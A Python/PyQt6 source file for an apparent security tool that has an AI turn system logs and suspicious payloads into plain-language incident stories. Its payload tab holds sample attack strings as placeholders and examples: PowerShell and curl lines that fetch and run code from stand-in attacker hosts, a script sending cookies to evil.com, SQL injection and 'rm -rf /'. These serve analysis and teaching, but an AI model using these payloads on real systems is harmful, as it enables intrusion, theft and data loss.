# ai_log_storyteller.py - AI 실시간 로그 스토리텔링
"""
MetaShield AI 실시간 로그 스토리텔링
시스템 로그를 AI가 분석해서 "무슨 일이 일어났는지" 스토리로 설명합니다.
기술적 로그를 비전문가도 이해할 수 있는 내러티브로 변환합니다.
"""

import json
import time
import re
import threading
from datetime import datetime, timedelta
from dataclasses import dataclass
from typing import List, Dict, Optional, Any
from PyQt6.QtWidgets import *
from PyQt6.QtCore import *
from PyQt6.QtGui import *

from advanced_ui_components import Card, PrimaryButton, SecondaryButton
from modern_ui_style import MODERN_STYLE
from config import get_ai_config
import openai

@dataclass
class LogEntry:
    """로그 엔트리"""
    timestamp: str
    source: str
    level: str
    message: str
    raw_log: str
    category: str  # authentication, network, system, security, application

@dataclass
class LogStory:
    """로그 스토리"""
    id: str
    title: str
    summary: str
    timeline: List[str]
    risk_level: str  # low, medium, high, critical
    story_content: str
    technical_details: List[str]
    recommendations: List[str]
    affected_systems: List[str]
    incident_type: str
    created_at: str

class LogAnalysisEngine(QObject):
    """AI 로그 분석 엔진"""
    
    story_generated = pyqtSignal(dict)
    log_analyzed = pyqtSignal(dict)
    error_occurred = pyqtSignal(str)
    progress_updated = pyqtSignal(int, str)
    
    def __init__(self):
        super().__init__()
        self.ai_config = get_ai_config()
        self.client = None
        self.initialize_ai_client()
        
        # 로그 패턴 정의
        self.log_patterns = {
            'authentication': {
                'failed_login': r'(failed|invalid|incorrect).*(login|logon|authentication)',
                'successful_login': r'(successful|succeed).*(login|logon|authentication)',
                'account_locked': r'account.*(locked|disabled|suspended)',
                'password_change': r'password.*(changed|reset|updated)',
                'privilege_escalation': r'(privilege|permission).*(escalat|elevat|grant)'
            },
            'network': {
                'connection_failed': r'connection.*(failed|refused|timeout)',
                'suspicious_traffic': r'(suspicious|anomal).*(traffic|connection)',
                'port_scan': r'port.*(scan|probe)',
                'ddos_attempt': r'(ddos|flood|overwhelm)',
                'firewall_block': r'(firewall|blocked|denied)'
            },
            'security': {
                'malware_detected': r'(malware|virus|trojan).*(detect|found)',
                'intrusion_attempt': r'(intrusion|breach|unauthorized).*(attempt|access)',
                'file_modification': r'(file|system).*(modified|changed|altered)',
                'policy_violation': r'policy.*(violation|breach)',
                'certificate_error': r'certificate.*(invalid|expired|error)'
            },
            'system': {
                'service_start': r'service.*(start|begin)',
                'service_stop': r'service.*(stop|end|terminate)',
                'system_reboot': r'(system|server).*(reboot|restart)',
                'disk_full': r'disk.*(full|space|low)',
                'memory_high': r'memory.*(high|full|limit)'
            }
        }
        
        # 위험도 매핑
        self.risk_mapping = {
            'failed_login': 'medium',
            'successful_login': 'low',
            'account_locked': 'high',
            'malware_detected': 'critical',
            'intrusion_attempt': 'critical',
            'ddos_attempt': 'high',
            'file_modification': 'medium',
            'suspicious_traffic': 'medium'
        }
        
        # 스토리 템플릿
        self.story_templates = {
            'authentication_attack': {
                'title': '인증 공격 시도 탐지',
                'opener': '보안 시스템이 수상한 로그인 활동을 감지했습니다.',
                'risk_indicators': ['multiple failed logins', 'unusual login times', 'unknown locations']
            },
            'malware_incident': {
                'title': '악성코드 감염 사고',
                'opener': '시스템에서 악성코드가 발견되었습니다.',
                'risk_indicators': ['suspicious files', 'unusual network activity', 'system modifications']
            },
            'network_intrusion': {
                'title': '네트워크 침입 시도',
                'opener': '외부에서 네트워크 침입을 시도한 흔적이 발견되었습니다.',
                'risk_indicators': ['port scanning', 'brute force attempts', 'unauthorized access']
            }
        }
    
    def initialize_ai_client(self):
        """AI 클라이언트 초기화"""
        try:
            if self.ai_config.is_valid():
                self.client = openai.AzureOpenAI(
                    api_key=self.ai_config.api_key,
                    api_version=self.ai_config.api_version,
                    azure_endpoint=self.ai_config.endpoint
                )
        except Exception as e:
            print(f"AI client initialization error: {e}")
    
    def analyze_logs(self, log_entries: List[LogEntry]):
        """로그 분석 및 스토리 생성"""
        if not self.client:
            self.error_occurred.emit("AI 클라이언트가 초기화되지 않았습니다.")
            return
        
        # 백그라운드에서 분석
        self.analysis_thread = threading.Thread(
            target=self._analyze_logs_background,
            args=(log_entries,)
        )
        self.analysis_thread.start()
    
    def _analyze_logs_background(self, log_entries: List[LogEntry]):
        """백그라운드에서 로그 분석"""
        try:
            self.progress_updated.emit(10, "로그 패턴 분석 중...")
            
            # 로그 패턴 분석
            categorized_logs = self._categorize_logs(log_entries)
            
            self.progress_updated.emit(30, "로그 연관성 분석 중...")
            
            # 연관성 분석
            correlations = self._find_correlations(categorized_logs)
            
            self.progress_updated.emit(50, "AI가 스토리를 생성하는 중...")
            
            # AI로 스토리 생성
            story = self._generate_story_with_ai(categorized_logs, correlations)
            
            self.progress_updated.emit(80, "위험도 평가 중...")
            
            # 위험도 평가
            risk_assessment = self._assess_risk(categorized_logs)
            story.update(risk_assessment)
            
            self.progress_updated.emit(100, "스토리 생성 완료!")
            
            # UI 업데이트
            self.story_generated.emit(story)
            
        except Exception as e:
            self.error_occurred.emit(f"로그 분석 오류: {str(e)}")
    
    def _categorize_logs(self, log_entries: List[LogEntry]) -> Dict[str, List[LogEntry]]:
        """로그를 카테고리별로 분류"""
        categorized = {
            'authentication': [],
            'network': [],
            'security': [],
            'system': [],
            'application': []
        }
        
        for log in log_entries:
            log_lower = log.message.lower()
            classified = False
            
            for category, patterns in self.log_patterns.items():
                for pattern_name, pattern in patterns.items():
                    if re.search(pattern, log_lower, re.IGNORECASE):
                        log.category = f"{category}_{pattern_name}"
                        categorized[category].append(log)
                        classified = True
                        break
                if classified:
                    break
            
            if not classified:
                categorized['application'].append(log)
        
        return categorized
    
    def _find_correlations(self, categorized_logs: Dict[str, List[LogEntry]]) -> List[Dict]:
        """로그 간 연관성 찾기"""
        correlations = []
        
        # 시간 기반 연관성 (5분 이내 발생한 이벤트들)
        all_logs = []
        for category, logs in categorized_logs.items():
            all_logs.extend(logs)
        
        # 시간순 정렬
        all_logs.sort(key=lambda x: x.timestamp)
        
        # 연관성 패턴 찾기
        for i, log in enumerate(all_logs):
            related_logs = []
            log_time = datetime.fromisoformat(log.timestamp.replace('Z', '+00:00'))
            
            # 앞뒤 5분 이내의 로그 찾기
            for j, other_log in enumerate(all_logs[max(0, i-10):i+10]):
                if j == i:
                    continue
                    
                other_time = datetime.fromisoformat(other_log.timestamp.replace('Z', '+00:00'))
                time_diff = abs((log_time - other_time).total_seconds())
                
                if time_diff <= 300:  # 5분 이내
                    related_logs.append(other_log)
            
            if related_logs:
                correlations.append({
                    'main_event': log,
                    'related_events': related_logs,
                    'correlation_type': 'temporal'
                })
        
        return correlations
    
    def _generate_story_with_ai(self, categorized_logs: Dict[str, List[LogEntry]], correlations: List[Dict]) -> Dict:
        """AI로 로그 스토리 생성"""
        # 로그 요약 생성
        log_summary = self._create_log_summary(categorized_logs)
        
        # AI 프롬프트 생성
        prompt = self._create_storytelling_prompt(log_summary, correlations)
        
        # AI 호출
        response = self.client.chat.completions.create(
            model=self.ai_config.deployment,
            messages=[
                {"role": "system", "content": "당신은 사이버 보안 전문가이자 훌륭한 스토리텔러입니다. 복잡한 기술적 로그를 일반인도 이해할 수 있는 명확하고 흥미로운 이야기로 변환해주세요."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.7,
            max_tokens=3000
        )
        
        # 응답 파싱
        story_content = response.choices[0].message.content
        
        return self._parse_story_response(story_content, categorized_logs)
    
    def _create_log_summary(self, categorized_logs: Dict[str, List[LogEntry]]) -> str:
        """로그 요약 생성"""
        summary_parts = []
        
        for category, logs in categorized_logs.items():
            if not logs:
                continue
                
            summary_parts.append(f"\n=== {category.upper()} 로그 ({len(logs)}건) ===")
            
            # 대표적인 로그 몇 개만 선택
            sample_logs = logs[:5]
            for log in sample_logs:
                summary_parts.append(f"[{log.timestamp}] {log.message}")
        
        return '\n'.join(summary_parts)
    
    def _create_storytelling_prompt(self, log_summary: str, correlations: List[Dict]) -> str:
        """스토리텔링 프롬프트 생성"""
        prompt = f"""
다음 시스템 로그들을 분석하여 "무슨 일이 일어났는지"를 일반인도 이해할 수 있는 스토리로 설명해주세요.

{log_summary}

다음 형식으로 응답해주세요:

## 📖 로그 스토리: [제목]

### 🕰️ 상황 요약
[1-2문장으로 전체 상황 요약]

### 📚 상세 스토리
[시간 순서대로 무슨 일이 일어났는지 스토리텔링]
- 오늘 오후 3시 42분부터 시작된 이 사건은...
- 먼저 시스템에서 5번의 로그인 실패가 감지되었습니다...
- 이어서 관리자 계정으로 성공적인 로그인이 확인되었습니다...
- [계속해서 시간 순서대로 설명]

### ⚠️ 위험도 평가
- **위험 수준**: [낮음/보통/높음/심각]
- **영향 범위**: [설명]
- **즉시 조치 필요성**: [설명]

### 🎯 추천 대응방안
1. [즉시 해야할 조치]
2. [단기 대응방안]
3. [장기 예방책]

### 🔍 기술적 세부사항
- 관련 시스템: [목록]
- 주요 이벤트: [목록]
- 로그 패턴: [분석 결과]

기술적인 용어보다는 "누가, 언제, 어디서, 무엇을, 왜, 어떻게"의 관점에서 스토리를 만들어주세요.
마치 탐정이 사건을 설명하듯이 흥미롭고 이해하기 쉽게 작성해주세요.
"""
        return prompt
    
    def _parse_story_response(self, content: str, categorized_logs: Dict) -> Dict:
        """AI 응답을 구조화된 스토리로 파싱"""
        story_data = {
            "id": f"story_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            "title": self._extract_title(content),
            "summary": self._extract_summary(content),
            "story_content": content,
            "timeline": self._extract_timeline(content),
            "risk_level": self._extract_risk_level(content),
            "recommendations": self._extract_recommendations(content),
            "technical_details": self._extract_technical_details(content),
            "affected_systems": self._get_affected_systems(categorized_logs),
            "incident_type": self._determine_incident_type(categorized_logs),
            "created_at": datetime.now().isoformat(),
            "log_count": sum(len(logs) for logs in categorized_logs.values())
        }
        
        return story_data
    
    def _extract_title(self, content: str) -> str:
        """제목 추출"""
        lines = content.split('\n')
        for line in lines:
            if '로그 스토리:' in line:
                return line.split('로그 스토리:')[-1].strip()
        return "로그 분석 스토리"
    
    def _extract_summary(self, content: str) -> str:
        """요약 추출"""
        lines = content.split('\n')
        in_summary = False
        summary_lines = []
        
        for line in lines:
            if '상황 요약' in line:
                in_summary = True
                continue
            elif line.startswith('###') and in_summary:
                break
            elif in_summary and line.strip():
                summary_lines.append(line.strip())
        
        return ' '.join(summary_lines)
    
    def _extract_timeline(self, content: str) -> List[str]:
        """타임라인 추출"""
        lines = content.split('\n')
        timeline = []
        
        for line in lines:
            if re.search(r'\d{1,2}:\d{2}', line) or '시간' in line or '분' in line:
                timeline.append(line.strip())
        
        return timeline[:10]  # 최대 10개
    
    def _extract_risk_level(self, content: str) -> str:
        """위험도 추출"""
        risk_keywords = {
            'critical': ['심각', '위험', '긴급'],
            'high': ['높음', '주의'],
            'medium': ['보통', '중간'],
            'low': ['낮음', '경미']
        }
        
        content_lower = content.lower()
        
        for level, keywords in risk_keywords.items():
            for keyword in keywords:
                if keyword in content_lower:
                    return level
        
        return 'medium'
    
    def _extract_recommendations(self, content: str) -> List[str]:
        """권고사항 추출"""
        lines = content.split('\n')
        recommendations = []
        in_recommendations = False
        
        for line in lines:
            if '추천 대응방안' in line or '권고사항' in line:
                in_recommendations = True
                continue
            elif line.startswith('###') and in_recommendations:
                break
            elif in_recommendations and line.strip():
                if line.strip().startswith(('1.', '2.', '3.', '-', '•')):
                    recommendations.append(line.strip())
        
        return recommendations
    
    def _extract_technical_details(self, content: str) -> List[str]:
        """기술적 세부사항 추출"""
        lines = content.split('\n')
        details = []
        in_technical = False
        
        for line in lines:
            if '기술적 세부사항' in line:
                in_technical = True
                continue
            elif line.startswith('#') and in_technical:
                break
            elif in_technical and line.strip():
                if ':' in line:
                    details.append(line.strip())
        
        return details
    
    def _get_affected_systems(self, categorized_logs: Dict) -> List[str]:
        """영향받은 시스템 목록"""
        systems = set()
        
        for logs in categorized_logs.values():
            for log in logs:
                if log.source:
                    systems.add(log.source)
        
        return list(systems)[:10]  # 최대 10개
    
    def _determine_incident_type(self, categorized_logs: Dict) -> str:
        """사고 유형 결정"""
        if categorized_logs['security']:
            return "보안 사고"
        elif categorized_logs['authentication']:
            return "인증 관련 사고"
        elif categorized_logs['network']:
            return "네트워크 사고"
        elif categorized_logs['system']:
            return "시스템 사고"
        else:
            return "일반 사고"
    
    def _assess_risk(self, categorized_logs: Dict) -> Dict:
        """위험도 평가"""
        risk_score = 0
        high_risk_patterns = ['malware_detected', 'intrusion_attempt', 'ddos_attempt']
        
        for logs in categorized_logs.values():
            for log in logs:
                if any(pattern in log.category for pattern in high_risk_patterns):
                    risk_score += 3
                elif 'failed' in log.category:
                    risk_score += 1
        
        if risk_score >= 10:
            risk_level = 'critical'
        elif risk_score >= 5:
            risk_level = 'high'
        elif risk_score >= 2:
            risk_level = 'medium'
        else:
            risk_level = 'low'
        
        return {
            'risk_score': risk_score,
            'calculated_risk_level': risk_level
        }

class LogStorytellerTab(QWidget):
    """AI 로그 스토리텔링 탭"""
    
    def __init__(self):
        super().__init__()
        self.engine = LogAnalysisEngine()
        self.engine.story_generated.connect(self.on_story_generated)
        self.engine.error_occurred.connect(self.on_error_occurred)
        self.engine.progress_updated.connect(self.on_progress_updated)
        
        self.current_logs = []
        self.current_story = None
        
        self.setup_ui()
    
    def setup_ui(self):
        """UI 설정"""
        layout = QVBoxLayout(self)
        layout.setContentsMargins(15, 10, 15, 15)  # 상단 여백 축소
        layout.setSpacing(10)  # 간격 축소
        
        # 제목 (크기 축소)
        title = QLabel("📖 AI 실시간 로그 스토리텔링")
        title.setStyleSheet("font-size: 18px; font-weight: bold; color: #1890ff; margin-bottom: 5px;")
        layout.addWidget(title)
        
        # 설명
        desc = QLabel("시스템 로그를 AI가 분석해서 '무슨 일이 일어났는지'를 이해하기 쉬운 스토리로 설명합니다.")
        desc.setStyleSheet("color: #666; margin-bottom: 20px;")
        layout.addWidget(desc)
        
        # 탭 위젯
        tab_widget = QTabWidget()
        tab_widget.setStyleSheet("""
            QTabWidget::pane {
                border: 1px solid #d9d9d9;
                background-color: white;
            }
            QTabBar::tab {
                background-color: #f0f0f0;
                padding: 8px 16px;
                margin-right: 2px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected {
                background-color: white;
                border-bottom: 2px solid #1890ff;
            }
        """)
        
        # 로그 입력 탭
        self.input_tab = self.create_input_tab()
        tab_widget.addTab(self.input_tab, "📥 로그 입력")
        
        # 페이로드 스토리텔링 탭 (신규)
        self.payload_tab = self.create_payload_tab()
        tab_widget.addTab(self.payload_tab, "🔍 페이로드 스토리텔링")
        
        # 스토리 결과 탭
        self.story_tab = self.create_story_tab()
        tab_widget.addTab(self.story_tab, "📚 스토리 결과")
        
        # 분석 대시보드 탭
        self.dashboard_tab = self.create_dashboard_tab()
        tab_widget.addTab(self.dashboard_tab, "📊 분석 대시보드")
        
        layout.addWidget(tab_widget)
    
    def create_input_tab(self):
        """로그 입력 탭"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # 로그 입력 방법 선택
        method_card = Card("로그 입력 방법")
        method_layout = QHBoxLayout()
        
        self.input_method = QButtonGroup()
        
        self.paste_radio = QRadioButton("직접 붙여넣기")
        self.paste_radio.setChecked(True)
        self.input_method.addButton(self.paste_radio, 0)
        method_layout.addWidget(self.paste_radio)
        
        self.file_radio = QRadioButton("파일에서 읽기")
        self.input_method.addButton(self.file_radio, 1)
        method_layout.addWidget(self.file_radio)
        
        self.realtime_radio = QRadioButton("실시간 모니터링")
        self.input_method.addButton(self.realtime_radio, 2)
        method_layout.addWidget(self.realtime_radio)
        
        method_layout.addStretch()
        
        method_card.layout().addLayout(method_layout)
        layout.addWidget(method_card)
        
        # 로그 입력 영역
        input_card = Card("로그 데이터")
        
        self.log_input = QTextEdit()
        self.log_input.setPlaceholderText(
            "시스템 로그를 여기에 붙여넣으세요. 예시:\n\n"
            "2024-01-15 15:42:15 [ERROR] Authentication failed for user 'admin' from 192.168.1.100\n"
            "2024-01-15 15:42:30 [ERROR] Authentication failed for user 'admin' from 192.168.1.100\n"
            "2024-01-15 15:42:45 [ERROR] Authentication failed for user 'admin' from 192.168.1.100\n"
            "2024-01-15 15:43:01 [INFO] Authentication successful for user 'admin' from 192.168.1.100\n"
            "2024-01-15 15:43:15 [WARNING] User 'admin' accessed sensitive files\n"
            "2024-01-15 15:43:30 [ERROR] Suspicious file modification detected: /etc/passwd\n"
        )
        self.log_input.setMinimumHeight(200)
        self.log_input.setStyleSheet("""
            QTextEdit {
                border: 2px solid #d9d9d9;
                border-radius: 8px;
                padding: 12px;
                font-family: 'Consolas', 'Courier New', monospace;
                font-size: 12px;
                line-height: 1.4;
            }
            QTextEdit:focus {
                border-color: #1890ff;
            }
        """)
        
        input_card.layout().addWidget(self.log_input)
        layout.addWidget(input_card)
        
        # 파일 선택 영역 (처음에는 숨김)
        self.file_card = Card("파일 선택")
        file_layout = QHBoxLayout()
        
        self.file_path_input = QLineEdit()
        self.file_path_input.setPlaceholderText("로그 파일 경로")
        self.file_path_input.setEnabled(False)
        file_layout.addWidget(self.file_path_input)
        
        self.browse_btn = SecondaryButton("📁 파일 선택")
        self.browse_btn.clicked.connect(self.browse_log_file)
        self.browse_btn.setEnabled(False)
        file_layout.addWidget(self.browse_btn)
        
        self.load_btn = SecondaryButton("📄 로드")
        self.load_btn.clicked.connect(self.load_log_file)
        self.load_btn.setEnabled(False)
        file_layout.addWidget(self.load_btn)
        
        self.file_card.layout().addLayout(file_layout)
        self.file_card.setVisible(False)
        layout.addWidget(self.file_card)
        
        # 예시 로그 버튼들
        examples_card = Card("예시 로그 데이터 (클릭하여 자동 입력)")
        examples_layout = QVBoxLayout()
        
        example_buttons = [
            ("🔐 인증 공격", self.get_auth_attack_example()),
            ("🦠 악성코드 감염", self.get_malware_example()),
            ("🌐 네트워크 침입", self.get_network_intrusion_example()),
            ("⚠️ 시스템 오류", self.get_system_error_example()),
            ("📊 일반 운영", self.get_normal_operation_example())
        ]
        
        button_layout = QHBoxLayout()
        for i, (title, example_data) in enumerate(example_buttons):
            btn = SecondaryButton(title)
            btn.clicked.connect(lambda checked, data=example_data: self.log_input.setText(data))
            button_layout.addWidget(btn)
            
            if i == 2:  # 3개마다 줄바꿈
                examples_layout.addLayout(button_layout)
                button_layout = QHBoxLayout()
        
        if button_layout.count() > 0:
            examples_layout.addLayout(button_layout)
        
        examples_card.layout().addLayout(examples_layout)
        layout.addWidget(examples_card)
        
        # 분석 시작 버튼
        analyze_layout = QHBoxLayout()
        
        self.analyze_btn = PrimaryButton("🔍 AI로 로그 스토리 생성")
        self.analyze_btn.clicked.connect(self.start_analysis)
        analyze_layout.addWidget(self.analyze_btn)
        
        analyze_layout.addStretch()
        
        self.clear_btn = SecondaryButton("🧹 지우기")
        self.clear_btn.clicked.connect(self.clear_logs)
        analyze_layout.addWidget(self.clear_btn)
        
        layout.addLayout(analyze_layout)
        
        # 진행 상황 표시
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        layout.addWidget(self.progress_bar)
        
        self.progress_label = QLabel("")
        self.progress_label.setVisible(False)
        self.progress_label.setStyleSheet("color: #1890ff; font-weight: bold;")
        layout.addWidget(self.progress_label)
        
        # 입력 방법 변경 시 UI 업데이트
        self.input_method.buttonClicked.connect(self.on_input_method_changed)
        
        layout.addStretch()
        return widget
    
    def create_story_tab(self):
        """스토리 결과 탭"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # 스토리 헤더
        header_card = Card()
        header_layout = QGridLayout()
        
        self.story_title_label = QLabel("스토리 제목")
        self.story_title_label.setStyleSheet("font-size: 18px; font-weight: bold; color: #1890ff;")
        header_layout.addWidget(self.story_title_label, 0, 0)
        
        self.story_date_label = QLabel("생성일: --")
        header_layout.addWidget(self.story_date_label, 0, 1)
        
        self.risk_level_label = QLabel("위험도: --")
        header_layout.addWidget(self.risk_level_label, 1, 0)
        
        self.log_count_label = QLabel("로그 수: --")
        header_layout.addWidget(self.log_count_label, 1, 1)
        
        header_card.layout().addLayout(header_layout)
        layout.addWidget(header_card)
        
        # 스토리 내용
        story_card = Card("📖 AI 생성 스토리")
        
        self.story_display = QTextBrowser()
        self.story_display.setStyleSheet("""
            QTextBrowser {
                border: 1px solid #d9d9d9;
                border-radius: 8px;
                background-color: white;
                font-family: 'Malgun Gothic', sans-serif;
                font-size: 14px;
                line-height: 1.7;
                padding: 20px;
            }
        """)
        self.story_display.setHtml("""
        <div style='text-align: center; color: #999; padding: 50px;'>
            <h3>📚 스토리 생성 대기 중</h3>
            <p>로그 데이터를 입력하고 '스토리 생성' 버튼을 클릭하세요.</p>
            <p>AI가 로그를 분석하여 이해하기 쉬운 스토리로 만들어드립니다.</p>
        </div>
        """)
        
        story_card.layout().addWidget(self.story_display)
        layout.addWidget(story_card)
        
        # 스토리 액션 버튼들
        actions_layout = QHBoxLayout()
        
        self.export_story_btn = SecondaryButton("📄 스토리 내보내기")
        self.export_story_btn.clicked.connect(self.export_story)
        self.export_story_btn.setEnabled(False)
        actions_layout.addWidget(self.export_story_btn)
        
        self.share_btn = SecondaryButton("📤 공유")
        self.share_btn.clicked.connect(self.share_story)
        self.share_btn.setEnabled(False)
        actions_layout.addWidget(self.share_btn)
        
        actions_layout.addStretch()
        
        self.regenerate_story_btn = PrimaryButton("🔄 다시 생성")
        self.regenerate_story_btn.clicked.connect(self.regenerate_story)
        self.regenerate_story_btn.setEnabled(False)
        actions_layout.addWidget(self.regenerate_story_btn)
        
        layout.addLayout(actions_layout)
        
        return widget
    
    def create_dashboard_tab(self):
        """분석 대시보드 탭"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # 요약 통계
        stats_layout = QHBoxLayout()
        
        # 로그 분류 통계
        self.category_card = Card("로그 분류")
        category_layout = QVBoxLayout()
        
        self.auth_count_label = QLabel("인증: 0건")
        category_layout.addWidget(self.auth_count_label)
        
        self.network_count_label = QLabel("네트워크: 0건")
        category_layout.addWidget(self.network_count_label)
        
        self.security_count_label = QLabel("보안: 0건")
        category_layout.addWidget(self.security_count_label)
        
        self.system_count_label = QLabel("시스템: 0건")
        category_layout.addWidget(self.system_count_label)
        
        self.category_card.layout().addLayout(category_layout)
        stats_layout.addWidget(self.category_card)
        
        # 위험도 분포
        self.risk_card = Card("위험도 분포")
        risk_layout = QVBoxLayout()
        
        self.critical_count_label = QLabel("심각: 0건")
        self.critical_count_label.setStyleSheet("color: #ff4d4f; font-weight: bold;")
        risk_layout.addWidget(self.critical_count_label)
        
        self.high_count_label = QLabel("높음: 0건")
        self.high_count_label.setStyleSheet("color: #faad14; font-weight: bold;")
        risk_layout.addWidget(self.high_count_label)
        
        self.medium_count_label = QLabel("보통: 0건")
        self.medium_count_label.setStyleSheet("color: #1890ff; font-weight: bold;")
        risk_layout.addWidget(self.medium_count_label)
        
        self.low_count_label = QLabel("낮음: 0건")
        self.low_count_label.setStyleSheet("color: #52c41a; font-weight: bold;")
        risk_layout.addWidget(self.low_count_label)
        
        self.risk_card.layout().addLayout(risk_layout)
        stats_layout.addWidget(self.risk_card)
        
        # 시간대별 분포
        self.timeline_card = Card("시간대별 분석")
        timeline_layout = QVBoxLayout()
        
        self.timeline_info = QLabel("분석 결과가 없습니다.")
        timeline_layout.addWidget(self.timeline_info)
        
        self.timeline_card.layout().addLayout(timeline_layout)
        stats_layout.addWidget(self.timeline_card)
        
        layout.addLayout(stats_layout)
        
        # 주요 이벤트 타임라인
        timeline_card = Card("이벤트 타임라인")
        
        self.events_timeline = QListWidget()
        self.events_timeline.setStyleSheet("""
            QListWidget {
                border: 1px solid #d9d9d9;
                border-radius: 8px;
                background-color: #fafafa;
            }
            QListWidgetItem {
                padding: 12px;
                border-bottom: 1px solid #e0e0e0;
                background-color: white;
                margin: 2px;
                border-radius: 4px;
            }
        """)
        
        timeline_card.layout().addWidget(self.events_timeline)
        layout.addWidget(timeline_card)
        
        # 추천 대응방안
        recommendations_card = Card("추천 대응방안")
        
        self.recommendations_list = QListWidget()
        self.recommendations_list.setStyleSheet("""
            QListWidget {
                border: 1px solid #d9d9d9;
                border-radius: 8px;
                background-color: #f0f9ff;
            }
            QListWidgetItem {
                padding: 12px;
                border-bottom: 1px solid #e0e0e0;
                background-color: white;
                margin: 2px;
                border-radius: 4px;
            }
        """)
        
        recommendations_card.layout().addWidget(self.recommendations_list)
        layout.addWidget(recommendations_card)
        
        return widget
    
    def create_payload_tab(self):
        """페이로드 스토리텔링 탭 생성"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)
        
        # 설명
        desc_card = Card("🔍 페이로드 스토리텔링")
        desc_layout = QVBoxLayout()
        
        desc_label = QLabel("악성 페이로드, 스크립트, 명령어 등을 AI가 분석해서 '무엇을 하려고 했는지'를 스토리로 설명합니다.")
        desc_label.setStyleSheet("color: #666; font-size: 14px; margin-bottom: 10px;")
        desc_layout.addWidget(desc_label)
        
        # 페이로드 입력
        payload_input_label = QLabel("🔍 분석할 페이로드:")
        payload_input_label.setStyleSheet("font-weight: bold; font-size: 16px; margin-top: 10px;")
        desc_layout.addWidget(payload_input_label)
        
        self.payload_input = QTextEdit()
        self.payload_input.setPlaceholderText("""페이로드 예시:

PowerShell:
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/script.ps1')"

Bash:
curl -s http://attacker.com/backdoor.sh | bash; rm -rf /tmp/* && echo "cleaned"

SQL Injection:
' UNION SELECT username, password FROM users WHERE '1'='1

JavaScript:
<script>document.location="http://evil.com/steal.php?cookie="+document.cookie;</script>

Python:
import subprocess; subprocess.run(['rm', '-rf', '/'], shell=True)""")
        self.payload_input.setMinimumHeight(200)
        self.payload_input.setStyleSheet("""
            QTextEdit {
                border: 2px solid #d9d9d9;
                border-radius: 8px;
                padding: 12px;
                font-family: 'Consolas', 'Monaco', monospace;
                font-size: 13px;
                background-color: #fafafa;
            }
            QTextEdit:focus {
                border-color: #1890ff;
                background-color: white;
            }
        """)
        desc_layout.addWidget(self.payload_input)
        
        # 분석 옵션
        options_layout = QHBoxLayout()
        
        self.payload_detailed_cb = QCheckBox("상세 기술 분석 포함")
        self.payload_detailed_cb.setChecked(True)
        options_layout.addWidget(self.payload_detailed_cb)
        
        self.payload_mitigation_cb = QCheckBox("대응 방안 생성")
        self.payload_mitigation_cb.setChecked(True)
        options_layout.addWidget(self.payload_mitigation_cb)
        
        options_layout.addStretch()
        desc_layout.addLayout(options_layout)
        
        # 분석 버튼
        button_layout = QHBoxLayout()
        
        self.payload_analyze_btn = PrimaryButton("🔍 페이로드 스토리 생성")
        self.payload_analyze_btn.clicked.connect(self.analyze_payload)
        button_layout.addWidget(self.payload_analyze_btn)
        
        clear_payload_btn = SecondaryButton("🧹 지우기")
        clear_payload_btn.clicked.connect(lambda: self.payload_input.clear())
        button_layout.addWidget(clear_payload_btn)
        
        # 예시 버튼들
        example_layout = QHBoxLayout()
        
        powershell_btn = SecondaryButton("PowerShell 예시")
        powershell_btn.clicked.connect(lambda: self.payload_input.setText(self.get_powershell_example()))
        example_layout.addWidget(powershell_btn)
        
        sqli_btn = SecondaryButton("SQL Injection 예시")
        sqli_btn.clicked.connect(lambda: self.payload_input.setText(self.get_sqli_example()))
        example_layout.addWidget(sqli_btn)
        
        xss_btn = SecondaryButton("XSS 예시")
        xss_btn.clicked.connect(lambda: self.payload_input.setText(self.get_xss_example()))
        example_layout.addWidget(xss_btn)
        
        example_layout.addStretch()
        desc_layout.addLayout(example_layout)
        desc_layout.addLayout(button_layout)
        
        desc_card.layout().addLayout(desc_layout)
        layout.addWidget(desc_card)
        
        # 페이로드 스토리 결과
        story_card = Card("📖 페이로드 스토리")
        
        self.payload_story_display = QTextBrowser()
        self.payload_story_display.setStyleSheet("""
            QTextBrowser {
                border: 1px solid #d9d9d9;
                border-radius: 8px;
                background-color: white;
                padding: 20px;
                font-size: 14px;
                line-height: 1.6;
            }
        """)
        self.payload_story_display.setHtml("""
        <div style='text-align: center; color: #999; padding: 50px;'>
            <h3>🔍 페이로드 분석 대기 중</h3>
            <p>위에서 페이로드를 입력하고 '페이로드 스토리 생성' 버튼을 클릭하세요.</p>
            <p>AI가 페이로드의 동작과 목적을 분석해서 이해하기 쉬운 스토리로 설명합니다.</p>
        </div>
        """)
        
        story_card.layout().addWidget(self.payload_story_display)
        layout.addWidget(story_card)
        
        return widget
    
    def get_powershell_example(self) -> str:
        """PowerShell 페이로드 예시"""
        return """powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/script.ps1'); Start-Process calc.exe -WindowStyle Hidden"

# 다른 PowerShell 공격 예시
powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA="""
    
    def get_sqli_example(self) -> str:
        """SQL Injection 페이로드 예시"""
        return """' UNION SELECT username, password, email FROM users WHERE '1'='1' --

# 다른 SQL 인젝션 예시들
admin'; DROP TABLE users; --
' OR 1=1 LIMIT 1 OFFSET 0 --
' UNION SELECT 1,database(),version() --
' AND (SELECT SUBSTRING(@@version,1,1))='5' --"""
    
    def get_xss_example(self) -> str:
        """XSS 페이로드 예시"""
        return """<script>
document.location="http://evil.com/steal.php?cookie="+document.cookie;
</script>

# 다른 XSS 예시들
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
javascript:alert(document.cookie)
<iframe src="javascript:alert('XSS')">"""
    
    def analyze_payload(self):
        """페이로드 분석 및 스토리 생성"""
